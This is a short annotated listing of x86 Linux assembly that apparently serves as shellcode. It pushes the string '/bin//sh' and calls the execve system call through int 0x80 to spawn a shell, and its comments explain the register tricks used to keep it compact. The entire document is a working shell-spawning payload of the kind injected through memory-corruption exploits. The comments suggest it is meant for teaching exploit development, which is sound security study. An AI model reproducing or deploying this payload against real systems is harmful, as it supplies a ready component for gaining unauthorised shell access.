xorl   %ecx, %ecx;	// different bit of each register is '1'. If the same register is used with xorl, the value of register is 0
push   $0xb;
pop    %eax;
cdq;			// %edx become 0 by cdq.
push   %edx;
push   $0x68732f2f;
push   $0x6e69622f;
xchg   %esp,%ebx;	// exchange %esp value for %ebx value like "mov %esp, %ebx;"
int    $0x80;
